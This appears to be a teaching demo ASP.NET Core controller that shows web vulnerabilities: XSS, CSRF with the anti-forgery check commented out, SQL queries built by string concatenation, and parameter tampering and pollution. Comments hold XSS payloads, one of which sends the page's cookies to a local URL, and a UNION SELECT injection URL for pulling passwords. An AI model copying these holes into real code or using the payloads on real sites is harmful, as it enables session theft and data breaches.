using System.Diagnostics;
using Microsoft.AspNetCore.Mvc;
using Security.Models;

namespace Security.Controllers;

public class SecurityController : Controller
{
    private readonly ILogger<SecurityController> _logger;

    public SecurityController(ILogger<SecurityController> logger)
    {
        _logger = logger;
    }

    public IActionResult Index()
    {
        return View();
    }

    public IActionResult Privacy()
    {
        return View();
    }

    //<a href="https://google.com">click me</a>
    //<script>alert('hacked!');</script>
    //<script>var img = new Image(0,0); img.src='https://localhost:7179/Security/SomeImage?c=' + document.cookie; document.body.appendChild(img);</script>
    //<img src='x' onerror="alert('XSS')">
    public IActionResult CrossSiteScripting(String searchText)
    {
        this.HttpContext.Response.Cookies.Append("myCookie", "myCookieValue");

        return View((object) searchText);
    }

    public IActionResult CrossSiteRequestForgery()
    {
        if (this.HttpContext.Request.Cookies["myCookie"] != "myCookieValue") {
            return this.Unauthorized();
        }
        return View();
    }

    [HttpPost]
    //[ValidateAntiForgeryToken]
    public IActionResult CreateDataValue(string name, string value)
    {
        if (this.HttpContext.Request.Cookies["myCookie"] != "myCookieValue") {
            return this.Unauthorized();
        }

        Console.WriteLine("Записываю в базу данных: " + name + ", " + value);

        return View("CrossSiteRequestForgery");
    }

    public IActionResult SqlInjection()
    {
        return View();
    }

    public IActionResult Search(string searchText) {

        Console.WriteLine("Выполняю: SELECT * FROM table WHERE name='" + searchText + "'");

        return View("SqlInjection");
    }

    public IActionResult ParameterTampering() {
        return View();
    }

    [HttpPost]
    public IActionResult ParameterTampering(Book model) {

        if (!this.ModelState.IsValid) {
            return this.View(model);
        }

        Console.WriteLine("Сохраняю книгу { title=" + model.Title + " description=" + model.Description + " authorId=" + model.AuthorId + " id=" + model.Id + " }");

        return View();
    }

    public IActionResult ParameterPollution()
    {
        return View();
    }

    // https://localhost:7179/Security/SearchById?id=-1+UNION+SELECT+username&id=password+FROM+users
    public IActionResult SearchById(string id) {

        Console.WriteLine("Выполняю: SELECT * FROM table WHERE id='" + id + "'");

        return View("ParameterPollution");
    }

    [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
    public IActionResult Error()
    {
        return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
    }
}
